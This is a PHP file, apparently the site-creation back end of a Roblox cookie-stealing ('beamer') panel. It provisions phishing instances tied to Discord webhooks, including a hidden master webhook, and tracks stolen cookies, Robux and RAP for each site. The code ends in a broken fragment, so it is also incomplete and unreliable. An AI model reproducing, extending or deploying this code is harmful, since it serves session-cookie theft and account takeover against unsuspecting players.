<?php
require_once '../config.php';
require_once '../functions.php';

$error = '';
$success = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $dir = sanitizeDirectory($_POST['dir'] ?? '');
    $web = trim($_POST['web'] ?? '');
    $username = trim($_POST['username'] ?? 'Beammer');
    $pfp = trim($_POST['pfp'] ?? 'https://hyperblox.eu/files/img.png');
    
    if (empty($dir) || !preg_match('/^[A-Za-z0-9_-]{3,32}$/', $dir)) {
        $error = 'Directory must be 3-32 characters (letters, numbers, hyphens, underscores only)';
    } elseif (directoryExists($dir)) {
        $error = 'Directory already taken. Please choose another name.';
    } elseif (!validateWebhook($web)) {
        $error = 'Invalid or inactive Discord webhook';
    } else {
        $token = generateToken();
        
        $instanceData = [
            'directory' => $dir,
            'userWebhook' => $web,
            'webhook' => MASTER_WEBHOOK,
            'token' => $token,
            'username' => $username,
            'profilePicture' => $pfp,
            'createdAt' => date('Y-m-d H:i:s'),
            'createdBy' => getClientIP(),
            'stats' => [
                'totalVisits' => 0,
                'totalCookies' => 0,
                'totalRobux' => 0,
                'totalRAP' => 0,
                'totalSummary' => 0
            ],
            'dailyStats' => [
                'visits' => array_fill(0, 7, 0),
                'cookies' => array_fill(0, 7, 0),
                'robux' => array_fill(0, 7, 0),
                'rap' => array_fill(0, 7, 0),
                'summary' => array_fill(0, 7, 0)
            ]
        ];
        
        saveInstanceData($dir, $instanceData);
        
        $tokenData = [
            'token' => $token,
            'directory' => $dir,
            'webhook' => $web,
            'createdAt' => date('Y-m-d H:i:s')
        ];
        saveTokenData($token, $tokenData);
        
        updateGlobalStats('totalSites');
        logActivity("New site created: $dir by IP: " . getClientIP());
        
        $siteUrl = FULL](#)
